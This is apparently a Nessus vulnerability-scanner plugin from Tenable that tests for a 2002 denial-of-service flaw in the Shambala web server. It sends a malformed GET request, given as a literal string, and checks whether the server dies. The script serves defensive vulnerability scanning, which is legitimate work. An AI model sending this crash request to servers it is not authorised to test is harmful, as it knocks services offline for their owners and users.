#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CVE
#
# Status: untested


include("compat.inc");

if(description)
{
 script_id(10967);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2002-0876");
 script_bugtraq_id(4897);
 script_xref(name:"OSVDB", value:"8443");

 script_name(english:"Shambala Web Server Malformed HTTP GET Request DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
'It was possible to kill the web server by sending this request :
GET !"#?%&/()=?
Shambala is known to be vulnerable to this attack.' );
 script_set_attribute(attribute:"solution", value:
"Install a safer server or upgrade it." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english: "Kills a Shambala web server");
 script_category(ACT_DENIAL); 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_require_ports("Services/www", 80);
 script_dependencies("http_version.nasl", "no404.nasl");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

########
include("global_settings.inc");
include("http_func.inc");

if (report_paranoia < 2) exit(0);	# DoS may trigger FP

req = '!"#?%&/()=?';

port = get_http_port(default:80);

  if(http_is_dead(port:port))exit(0);
  soc = http_open_socket(port);
  if(soc)
  {
  data = http_get(item:req, port:port);
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);
 
  if(http_is_dead(port:port, retry: 3))security_warning(port);
  }

